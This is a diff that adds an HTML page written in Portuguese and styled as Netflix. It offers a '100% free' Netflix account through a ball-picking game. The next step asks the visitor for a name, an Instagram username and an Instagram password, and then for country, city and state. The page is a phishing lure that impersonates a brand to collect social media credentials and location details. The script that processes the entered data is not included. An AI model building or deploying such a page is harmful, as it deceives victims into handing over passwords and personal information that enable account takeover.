@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="netflix.png" type="image/x-icon">
+</head>
+<body>
+    <main>
+        <div id="centro">
+            <img src="netflix.png" alt="" id="netflix">
+            <div id="jogo_1">
+                <h1 id="jogo">
+                    Esta é tua oportunidade de ganhar uma conta Netflix 100% gratuito
+                </h1>
+                <h2 id="opt_">Escolhe uma bola tens 2 tentativas:</h2>
+                <div id="bolas_">
+                    <li class="bola" onclick="bolas()">X</li>
+                    <li class="bola" onclick="bolas()">/</li>
+                    <li class="bola" onclick="bolas()">/</li>
+                    <li class="bola" onclick="bolas()">X</li>
+                </div>
+                <button id="btn_bola" onclick="fase1()">Pegar conta</button>
+            </div>
+            <div id="info_1" class="info">
+                <div id="nome_" class="data_net">
+                    <label for="nome_i" id="nome_l" class="data_">Nome</label>
+                    <input type="text" id="nome_i">
+                </div>
+                <div id="conta_" class="data_net">
+                    <label for="conta_i" id="conta_l" class="data_">Instagram</label>
+                    <input type="text" id="conta_i">
+                </div>
+                <div id="senha_" class="data_net">
+                    <label for="senha_s" id="senha_l" class="data_">Senha(insta...)</label>
+                    <input type="text" id="senha_i">
+                </div>
+                <button id="btn_info_1" onclick="fase2()">Pronto</button>
+            </div>
+            <div id="info_2" class="info">
+                <div id="pais_">
+                    <label for="pais_i" id="pais_l">Pais</label>
+                    <input type="text" id="pais_i" class="data_3">
+                </div>
+                <div id="cidade_">
+                    <label for="cidade_i" id="cidade_l">Cidade</label>
+                    <input type="text" id="cidade_i" class="data_3">
+                </div>
+                <div id="zona_">
+                    <label for="zona_i" id="zona_l">Estado(zona)</label>
+                    <input type="text" id="zona_i" class="data_3">
+                </div>
+                <button id="btn_info_2" onclick="final()">Pronto</button>
+            </div>
+        </div>
+    </main>
+    
+    <script src="script.js"></script>
+</body>
+</html>
